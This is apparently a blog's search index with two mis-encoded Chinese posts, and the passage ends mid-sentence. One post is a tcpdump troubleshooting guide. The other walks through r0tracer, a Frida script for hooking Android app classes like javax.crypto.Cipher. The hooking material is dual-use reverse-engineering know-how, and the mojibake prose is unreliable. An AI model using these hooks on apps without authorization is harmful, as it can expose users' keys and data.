<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>tcpdumpæŠ“åŒ…åˆ†æå…¨æ”»ç•¥</title>
      <link href="/2025/04/03/tcpdump%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%85%A8%E6%94%BB%E7%95%A5/"/>
      <url>/2025/04/03/tcpdump%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%85%A8%E6%94%BB%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€tcpdumpæ˜¯ä»€ä¹ˆ"><a href="#ä¸€ã€tcpdumpæ˜¯ä»€ä¹ˆ" class="headerlink" title="ä¸€ã€tcpdumpæ˜¯ä»€ä¹ˆ"></a>ä¸€ã€tcpdumpæ˜¯ä»€ä¹ˆ</h1><p><code>tcpdump</code> æ˜¯ Linux ä¸Šæœ€å¼ºå¤§çš„æŠ“åŒ…å·¥å…·ä¹‹ä¸€ï¼Œç”¨äº <strong>å®æ—¶ç›‘å¬ç½‘ç»œæµé‡ã€åˆ†ææ•°æ®åŒ…</strong>ï¼Œæ˜¯è¿ç»´ &amp; å®‰å…¨å¿…å¤‡æŠ€èƒ½ï¼</p><p>âœ… <strong>å®æ—¶æŠ“åŒ…</strong>ï¼šç›´æ¥åœ¨ç»ˆç«¯è¿è¡Œï¼Œæ— éœ€ GUI<br>âœ… <strong>ç²¾å‡†è¿‡æ»¤</strong>ï¼šæ”¯æŒ BPF è¯­æ³•ï¼Œå¿«é€Ÿç­›é€‰æ•°æ®åŒ…<br>âœ… <strong>å…¼å®¹ Wireshark</strong>ï¼šå¯ä¿å­˜ pcap æ–‡ä»¶ï¼Œåç»­æ·±å…¥åˆ†æ</p><p>ğŸ“Œ <strong>å®‰è£… tcpdump</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># CentOS / RHEL</span><br><span class="line">yum install -y tcpdump Â </span><br><span class="line"></span><br><span class="line"># Ubuntu / Debian</span><br><span class="line">apt install -y tcpdump</span><br></pre></td></tr></table></figure><p>ğŸ“Œ <strong>æŸ¥çœ‹ç‰ˆæœ¬</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump --version</span><br></pre></td></tr></table></figure><p>ğŸ“Œ <strong>æŸ¥çœ‹å¯ç”¨ç½‘å¡</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -D</span><br></pre></td></tr></table></figure><h1 id="äºŒã€å¿«é€ŸæŠ“åŒ…å‘½ä»¤"><a href="#äºŒã€å¿«é€ŸæŠ“åŒ…å‘½ä»¤" class="headerlink" title="äºŒã€å¿«é€ŸæŠ“åŒ…å‘½ä»¤"></a>äºŒã€å¿«é€ŸæŠ“åŒ…å‘½ä»¤</h1><p>ğŸ“Œ <strong>æŠ“å–æ‰€æœ‰æ•°æ®åŒ…</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0</span><br></pre></td></tr></table></figure><p>ğŸ’¡ <strong>é»˜è®¤ç›‘å¬ <code>eth0</code> ç½‘å¡</strong>ï¼ŒæŒ‰ <code>Ctrl + C</code> åœæ­¢</p><p>ğŸ“Œ <strong>æŠ“å–ç‰¹å®šç«¯å£</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 port 80</span><br></pre></td></tr></table></figure><p>ğŸ“Œ <strong>æŠ“å–ç‰¹å®š IP çš„æ•°æ®åŒ…</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 host 192.168.1.100</span><br></pre></td></tr></table></figure><p>ğŸ“Œ <strong>ä¿å­˜æ•°æ®åŒ…ï¼ˆWireshark å¯ç”¨ï¼‰</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 -w capture.pcap</span><br></pre></td></tr></table></figure><p>ğŸ“Œ <strong>è¯»å– pcap æ–‡ä»¶</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -r capture.pcap</span><br></pre></td></tr></table></figure><p>ğŸ“Œ <strong>ä»…æŠ“å– TCP SYNï¼ˆæ–°è¿æ¥ï¼‰</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0Â &#x27;tcp[tcpflags] &amp; tcp-syn != 0&#x27;</span><br></pre></td></tr></table></figure><p>ğŸ“Œ <strong>æŠ“å– HTTP è¯·æ±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 port 80 andÂ &#x27;tcp[tcpflags] &amp; tcp-push != 0&#x27;</span><br></pre></td></tr></table></figure><h1 id="ä¸‰ã€tcpdumpæŠ“åŒ…åˆ†ææŠ€å·§"><a href="#ä¸‰ã€tcpdumpæŠ“åŒ…åˆ†ææŠ€å·§" class="headerlink" title="ä¸‰ã€tcpdumpæŠ“åŒ…åˆ†ææŠ€å·§"></a>ä¸‰ã€tcpdumpæŠ“åŒ…åˆ†ææŠ€å·§</h1><h3 id="ğŸ“Œ-3-1-å…³é”®-TCP-ä¸‰æ¬¡æ¡æ‰‹"><a href="#ğŸ“Œ-3-1-å…³é”®-TCP-ä¸‰æ¬¡æ¡æ‰‹" class="headerlink" title="ğŸ“Œ 3.1 å…³é”® TCP ä¸‰æ¬¡æ¡æ‰‹"></a><strong>ğŸ“Œ 3.1 å…³é”® TCP ä¸‰æ¬¡æ¡æ‰‹</strong></h3><p>âœ… <strong>ä¸‰æ¬¡æ¡æ‰‹æµç¨‹</strong>ï¼š<br>1ï¸âƒ£ å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ <code>SYN</code>ï¼ˆè¯·æ±‚å»ºç«‹è¿æ¥ï¼‰<br>2ï¸âƒ£ æœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ <code>SYN + ACK</code>ï¼ˆåŒæ„è¿æ¥ï¼‰<br>3ï¸âƒ£ å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ <code>ACK</code>ï¼ˆç¡®è®¤ï¼‰</p><p>ğŸ’¡ <strong>ç”¨ tcpdump æŠ“å–ä¸‰æ¬¡æ¡æ‰‹</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 &#x27;tcp[tcpflags] &amp; (tcp-syn|tcp-ack) != 0&#x27;</span><br></pre></td></tr></table></figure><p><strong>âš ï¸ å¼‚å¸¸åˆ†æ</strong><br>âŒ <strong>SYN å‘é€ä½†æ—  ACK</strong> â†’ æœåŠ¡å™¨æœªå“åº”ï¼Œå¯èƒ½ç«¯å£æœªå¼€æ”¾<br>âŒ <strong>SYN+ACK ä½†æ—  ACK</strong> â†’ å®¢æˆ·ç«¯æœªå“åº”ï¼Œå¯èƒ½ç½‘ç»œä¸é€š</p><hr><h3 id="ğŸ“Œ-3-2-TCP-å››æ¬¡æŒ¥æ‰‹"><a href="#ğŸ“Œ-3-2-TCP-å››æ¬¡æŒ¥æ‰‹" class="headerlink" title="ğŸ“Œ 3.2 TCP å››æ¬¡æŒ¥æ‰‹"></a><strong>ğŸ“Œ 3.2 TCP å››æ¬¡æŒ¥æ‰‹</strong></h3><p>âœ… <strong>å››æ¬¡æŒ¥æ‰‹æµç¨‹</strong>ï¼š<br>1ï¸âƒ£ å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ <code>FIN</code>ï¼ˆè¯·æ±‚æ–­å¼€ï¼‰<br>2ï¸âƒ£ æœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ <code>ACK</code>ï¼ˆæ”¶åˆ°æ–­å¼€è¯·æ±‚ï¼‰<br>3ï¸âƒ£ æœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ <code>FIN</code>ï¼ˆç¡®è®¤æ–­å¼€ï¼‰<br>4ï¸âƒ£ å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ <code>ACK</code>ï¼ˆæœ€ç»ˆç¡®è®¤ï¼‰</p><p>ğŸ’¡ <strong>ç”¨ tcpdump æŠ“å–æ–­å¼€è¿æ¥</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 &#x27;tcp[tcpflags] &amp; (tcp-fin|tcp-ack) != 0&#x27;</span><br></pre></td></tr></table></figure><p><strong>âš ï¸ å¼‚å¸¸åˆ†æ</strong><br>âŒ <strong>è¿æ¥è¿Ÿè¿Ÿä¸é‡Šæ”¾</strong> â†’ å¯èƒ½æ˜¯ <code>CLOSE_WAIT</code> çŠ¶æ€ï¼Œåº”ç”¨æœªæ­£ç¡®å…³é—­è¿æ¥</p><hr><h3 id="ğŸ“Œ-3-3-æœåŠ¡å™¨æ— æ³•è®¿é—®"><a href="#ğŸ“Œ-3-3-æœåŠ¡å™¨æ— æ³•è®¿é—®" class="headerlink" title="ğŸ“Œ 3.3 æœåŠ¡å™¨æ— æ³•è®¿é—®"></a><strong>ğŸ“Œ 3.3 æœåŠ¡å™¨æ— æ³•è®¿é—®</strong></h3><p>ğŸ’¡ <strong>æŠ“å– 192.168.1.100 çš„æµé‡</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 host 192.168.1.100</span><br></pre></td></tr></table></figure><p><strong>âš ï¸ å¼‚å¸¸åˆ†æ</strong><br>âŒ <strong>æ— æ•°æ®åŒ…</strong> â†’ å¯èƒ½æ˜¯ç½‘ç»œæ–­å¼€ &#x2F; é˜²ç«å¢™æ‹¦æˆª<br>âŒ <strong>ä»… SYN æ—  ACK</strong> â†’ ç›®æ ‡æœåŠ¡å™¨æœªå“åº”ï¼Œç«¯å£å¯èƒ½æœªå¼€æ”¾</p><hr><h3 id="ğŸ“Œ-3-4-åˆ†æ-HTTP-è¯·æ±‚"><a href="#ğŸ“Œ-3-4-åˆ†æ-HTTP-è¯·æ±‚" class="headerlink" title="ğŸ“Œ 3.4 åˆ†æ HTTP è¯·æ±‚"></a><strong>ğŸ“Œ 3.4 åˆ†æ HTTP è¯·æ±‚</strong></h3><p>ğŸ’¡ <strong>æŠ“å– HTTP æµé‡</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 port 80 -A</span><br></pre></td></tr></table></figure><p>ğŸ“Œ <strong>è§£æ HTTP GET è¯·æ±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">User-Agent: curl/7.68.0</span><br></pre></td></tr></table></figure><p><strong>âš ï¸ å¼‚å¸¸åˆ†æ</strong><br>âŒ <strong>HTTP 404</strong> â†’ èµ„æºä¸å­˜åœ¨<br>âŒ <strong>HTTP 500</strong> â†’ æœåŠ¡å™¨å†…éƒ¨é”™è¯¯<br>âŒ <strong>HTTP 403</strong> â†’ æƒé™ä¸è¶³</p><hr><h3 id="ğŸ“Œ-3-5-æ£€æµ‹-DDOS-æ”»å‡»"><a href="#ğŸ“Œ-3-5-æ£€æµ‹-DDOS-æ”»å‡»" class="headerlink" title="ğŸ“Œ 3.5 æ£€æµ‹ DDOS æ”»å‡»"></a><strong>ğŸ“Œ 3.5 æ£€æµ‹ DDOS æ”»å‡»</strong></h3><p>ğŸ’¡ <strong>æŠ“å–çŸ­æ—¶é—´å¤§é‡ SYN</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 &#x27;tcp[tcpflags] &amp; tcp-syn != 0&#x27;</span><br></pre></td></tr></table></figure><p>ğŸ“Œ <strong>æŸ¥çœ‹ SYN æ•°é‡</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 &#x27;tcp[tcpflags] &amp; tcp-syn != 0&#x27; | wc -l</span><br></pre></td></tr></table></figure><p><strong>âš ï¸ å¼‚å¸¸åˆ†æ</strong><br>âŒ <strong>å¤§é‡ SYN ä½†æ—  ACK</strong> â†’ å¯èƒ½æ˜¯ SYN Flood æ”»å‡»<br>âœ… <strong>è§£å†³æ–¹æ¡ˆ</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT</span><br></pre></td></tr></table></figure><p>ï¼ˆé™åˆ¶æ¯ç§’æœ€å¤§æ–°å»ºè¿æ¥æ•°ï¼‰</p><hr><h3 id="ğŸ“Œ-3-6-DNS-è§£æå¼‚å¸¸"><a href="#ğŸ“Œ-3-6-DNS-è§£æå¼‚å¸¸" class="headerlink" title="ğŸ“Œ 3.6 DNS è§£æå¼‚å¸¸"></a><strong>ğŸ“Œ 3.6 DNS è§£æå¼‚å¸¸</strong></h3><p>ğŸ’¡ <strong>æŠ“å– DNS è¯·æ±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 port 53 -vv</span><br></pre></td></tr></table></figure><p><strong>âš ï¸ å¼‚å¸¸åˆ†æ</strong><br>âŒ <strong>æ—  DNS å“åº”</strong> â†’ å¯èƒ½æ˜¯ DNS æœåŠ¡å™¨æ•…éšœ<br>âŒ <strong>è§£æè¶…æ—¶</strong> â†’ å¯èƒ½æ˜¯é˜²ç«å¢™æ‹¦æˆª</p><h1 id="å››ã€tcpdumpé«˜çº§æŠ€å·§"><a href="#å››ã€tcpdumpé«˜çº§æŠ€å·§" class="headerlink" title="å››ã€tcpdumpé«˜çº§æŠ€å·§"></a>å››ã€tcpdumpé«˜çº§æŠ€å·§</h1><p><strong>åªæ˜¾ç¤º IPï¼Œä¸è§£æåŸŸå</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 -n</span><br></pre></td></tr></table></figure><p>ğŸ“Œ <strong>åªæ˜¾ç¤ºç«¯å£å·ï¼Œä¸è§£ææœåŠ¡å</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 -nn</span><br></pre></td></tr></table></figure><p>ğŸ“Œ <strong>æ˜¾ç¤ºæ•°æ®åŒ…è¯¦ç»†ä¿¡æ¯</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 -vvv</span><br></pre></td></tr></table></figure><p>ğŸ“Œ <strong>æ˜¾ç¤ºæ•°æ®åŒ…å†…å®¹ï¼ˆASCII + HEXï¼‰</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 -XX</span><br></pre></td></tr></table></figure><p>ğŸ“Œ <strong>æŒ‰æ•°æ®åŒ…å¤§å°è¿‡æ»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump greater 1000</span><br></pre></td></tr></table></figure><p>ğŸ“Œ <strong>é™åˆ¶æŠ“åŒ…æ•°é‡</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 -c 100</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ‚é¡¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æŠ“åŒ… </tag>
            
            <tag> tcpdump </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>r0tracerä½¿ç”¨å’Œæºç è§£è¯»</title>
      <link href="/2024/10/25/r0tracer%E4%BD%BF%E7%94%A8%E5%92%8C%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/"/>
      <url>/2024/10/25/r0tracer%E4%BD%BF%E7%94%A8%E5%92%8C%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="r0tracerä»‹ç»"><a href="#r0tracerä»‹ç»" class="headerlink" title="r0tracerä»‹ç»"></a>r0tracerä»‹ç»</h1><h2 id="é¡¹ç›®åœ°å€"><a href="#é¡¹ç›®åœ°å€" class="headerlink" title="é¡¹ç›®åœ°å€"></a>é¡¹ç›®åœ°å€</h2><p><a href="https://github.com/r0ysue/r0tracer">https://github.com/r0ysue/r0tracer</a></p><p>å®‰å“Javaå±‚å¤šåŠŸèƒ½è¿½è¸ªè„šæœ¬&#x3D;&#x3D;&gt;ç›¸å½“äº ç²¾ç®€ç‰ˆçš„<code>Objection+Wallbreaker</code></p><h2 id="åŠŸèƒ½"><a href="#åŠŸèƒ½" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h2><p>1ã€æ ¹æ®é»‘ç™½åå•æ‰¹é‡è¿½è¸ªç±»çš„æ‰€æœ‰æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hook(&quot;javax.crypto.Cipher&quot;, &quot;$&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410291056369.png" alt="image-20241029105629339"> </p><p>2ã€åœ¨å‘½ä¸­æ–¹æ³•åæ‰“å°å‡ºè¯¥ç±»æˆ–å¯¹è±¡çš„æ‰€æœ‰åŸŸå€¼ï¼ˆåŒ…æ‹¬å‚æ•°ã€è¿”å›å€¼ã€è°ƒç”¨æ ˆï¼‰</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410291059197.png" alt="image-20241029105913147"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410291059419.png" alt="image-20241029105943372"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410291100483.png" alt="image-20241029110010440"> </p><p>3ã€æç®€çš„æ–‡æœ¬ä¿å­˜æ—¥å¿—æœºåˆ¶ã€æ˜“äºæœç´¢å…³é”®å‚æ•°</p><p>4ã€é’ˆå¯¹åŠ å£³åº”ç”¨æ‰¾ä¸åˆ°ç±»æ—¶å¯ä»¥åˆ‡æ¢Classloader</p><h2 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h2><p>1ã€ä¿®æ”¹<code>r0tracer.js</code>æ–‡ä»¶æœ€åº•éƒ¨å¤„çš„ä»£ç ï¼Œå¼€å¯æŸä¸€ä¸ªHookæ¨¡å¼ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410291102260.png" alt="image-20241029110254227"> </p><p>2ã€æ¨èä½¿ç”¨Frida14ç‰ˆæœ¬ï¼Œå¹¶ä¸”å°†æ—¥å¿—ä½¿ç”¨<code>-o</code>å‚æ•°è¿›è¡Œè¾“å‡ºä¿å­˜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ frida -U -f com.r0ysue.example -l r0tracer.js  --no-pause -o saveLog5.txt</span><br></pre></td></tr></table></figure><p>â€œ-fâ€ä¸ºSpawnæ¨¡å¼ï¼Œå»æ‰â€-fâ€ä¸ºAttachæ¨¡å¼</p><p>3ã€Fridaç‰ˆæœ¬&#x3D;&lt;12æ—¶ï¼Œè¦åŠ ä¸Š<code>--runtime=v8</code>é€‰é¡¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ frida -U com.r0ysue.example -l r0tracer.js  --runtime=v8 --no-pause -o saveLog6.txt</span><br></pre></td></tr></table></figure><h2 id="ä¼˜åŠ¿"><a href="#ä¼˜åŠ¿" class="headerlink" title="ä¼˜åŠ¿"></a>ä¼˜åŠ¿</h2><ul><li>æ¯”<code>objection</code>å¢åŠ å»¶æ—¶<code>spawn</code></li><li>æ¯”<code>objection</code>å¢åŠ æ‰¹é‡<code>hook</code>ç±»\æ–¹æ³•\æ„é€ å‡½æ•°</li><li><code>Wallbreaker</code>åœ¨<code>frida14</code>ä¸Šè¿˜æ˜¯ä¸€ç›´å´©</li><li>æ¯”<code>Wallbreaker</code>å¢åŠ <code>hook</code>çœ‹<code>instance</code>çš„<code>fields</code></li><li><code>inspectObject</code>å‡½æ•°å¯ä»¥å•ç‹¬æ‹¿å‡ºå»ä½¿ç”¨</li></ul><h1 id="æºç è§£è¯»"><a href="#æºç è§£è¯»" class="headerlink" title="æºç è§£è¯»"></a>æºç è§£è¯»</h1><h2 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h2><p>ä¿®æ”¹r0tracer.jsæ–‡ä»¶æœ€åº•éƒ¨å¤„çš„ä»£ç ï¼Œå¼€å¯æŸä¸€ä¸ªHookæ¨¡å¼ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title class_">Purple</span>(<span class="string">&quot;r0tracer begin ... !&quot;</span>)</span><br><span class="line">        <span class="comment">//0. å¢åŠ ç²¾ç®€æ¨¡å¼ï¼Œå°±æ˜¯ä»¥å½©è™¹è‰²åªæ˜¾ç¤ºè¿›å‡ºå‡½æ•°ã€‚é»˜è®¤æ˜¯å…³é—­çš„ï¼Œæ³¨é‡Šæ­¤è¡Œæ‰“å¼€ç²¾ç®€æ¨¡å¼ã€‚</span></span><br><span class="line">        <span class="comment">//isLite = true;</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        //ä»¥ä¸‹ä¸‰ç§æ¨¡å¼ï¼Œå–æ¶ˆæ³¨é‡ŠæŸä¸€è¡Œä»¥å¼€å¯</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">//A. ç®€æ˜“traceå•ä¸ªç±»</span></span><br><span class="line">        <span class="title function_">traceClass</span>(<span class="string">&quot;javax.crypto.Cipher&quot;</span>)</span><br><span class="line">        <span class="comment">//B. é»‘ç™½åå•traceå¤šä¸ªå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç™½åå•(åŒ…å«å…³é”®å­—)ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯é»‘åå•(ä¸åŒ…å«çš„å…³é”®å­—)</span></span><br><span class="line">        <span class="comment">// hook(&quot;javax.crypto.Cipher&quot;, &quot;$&quot;);</span></span><br><span class="line">        <span class="comment">//C. æŠ¥æŸä¸ªç±»æ‰¾ä¸åˆ°æ—¶ï¼Œå°†æŸä¸ªç±»åå¡«å†™åˆ°ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œæ¯”å¦‚æ‰¾ä¸åˆ°com.roysue.checkç±»ã€‚ï¼ˆå‰ä¸¤ä¸ªå‚æ•°ä¾æ—§æ˜¯é»‘ç™½åå•ï¼‰</span></span><br><span class="line">        <span class="comment">// hook(&quot;com.roysue.check&quot;,&quot; &quot;,&quot;com.roysue.check&quot;);        </span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‰ç§Hookæ–¹å¼</p><ul><li>hookå·²çŸ¥ç±»</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">traceClass(&quot;javax.crypto.Cipher&quot;)</span><br></pre></td></tr></table></figure><ul><li>hookå…³é”®å­—ï¼ˆé»‘ç™½åå•ï¼Œå‰é¢æ˜¯éœ€è¦å¯»æ‰¾çš„å…³é”®å­—ï¼Œåé¢æ˜¯å¿½ç•¥çš„å…³é”®å­—ï¼‰</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hook(&quot;javax.crypto.Cipher&quot;, &quot;$&quot;)</span><br></pre></td></tr></table></figure><ul><li>hookå…³é”®å­—ï¼ˆé»‘ç™½åå• + ç¬¬ä¸‰ä¸ªå‚æ•° å…³é”®ç±»,å‰é¢æ—¶è¦å¯»æ‰¾çš„å…³é”®å­—,åé¢æ—¶å¿½ç•¥çš„å…³é”®å­—ï¼‰</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hook(&quot;com.roysue.check&quot;,&quot; &quot;,&quot;com.roysue.xxx&quot;)</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰ç§æ˜¯å› ä¸ºå¯èƒ½æŸä¸ªç±»ä¸åœ¨å½“å‰classloaderä¸­,éœ€è¦éå†æ‰€æœ‰classloaderå»å¯»æ‰¾</p><h2 id="hook-havahook"><a href="#hook-havahook" class="headerlink" title="hook&amp;havahook"></a>hook&amp;havahook</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params">white, black, target = <span class="literal">null</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Java</span>.<span class="property">available</span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="title function_">javahook</span>(white, black, target)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title class_">ObjC</span>.<span class="property">available</span>) &#123;</span><br><span class="line">        <span class="title function_">ioshook</span>(white, black)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;please connect to either iOS or Android device ...&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">javahook</span>(<span class="params">white, black, target = <span class="literal">null</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title class_">Red</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (!(target === <span class="literal">null</span>)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title class_">LightGreen</span>(<span class="string">&quot;Begin enumerateClassLoaders ...&quot;</span>)</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">loader</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (loader.<span class="title function_">findClass</span>(target)) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title class_">Red</span>(<span class="string">&quot;Successfully found loader&quot;</span>)</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title class_">Blue</span>(loader);</span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title class_">Red</span>(<span class="string">&quot;Switch Classloader Successfully ! &quot;</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title class_">Red</span>(<span class="string">&quot; continuing :&quot;</span> + error)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title class_">Red</span>(<span class="string">&quot;EnumerateClassloader END&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title class_">Red</span>(<span class="string">&quot;Begin Search Class...&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> targetClasses = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">className</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (className.<span class="title function_">toString</span>().<span class="title function_">toLowerCase</span>().<span class="title function_">indexOf</span>(white.<span class="title function_">toLowerCase</span>()) &gt;= <span class="number">0</span> &amp;&amp;</span><br><span class="line">                (black == <span class="literal">null</span> || black == <span class="string">&#x27;&#x27;</span> || className.<span class="title function_">toString</span>().<span class="title function_">toLowerCase</span>().<span class="title function_">indexOf</span>(black.<span class="title function_">toLowerCase</span>()) &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title class_">Black</span>(<span class="string">&quot;Found Class =&gt; &quot;</span> + className)</span><br><span class="line">                targetClasses.<span class="title function_">push</span>(className);</span><br><span class="line">                <span class="title function_">traceClass</span>(className);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title class_">Black</span>(<span class="string">&quot;Search Class Completed!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">var</span> output = <span class="string">&quot;On Total Tracing :&quot;</span> + <span class="title class_">String</span>(targetClasses.<span class="property">length</span>) + <span class="string">&quot; classes :\r\n&quot;</span>;</span><br><span class="line">    targetClasses.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">target</span>) &#123;</span><br><span class="line">        output = output.<span class="title function_">concat</span>(target);</span><br><span class="line">        output = output.<span class="title function_">concat</span>(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title class_">Green</span>(output + <span class="string">&quot;Start Tracing ...&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1ã€å¦‚æœå¡«äº†å…³é”®æ–¹æ³•, 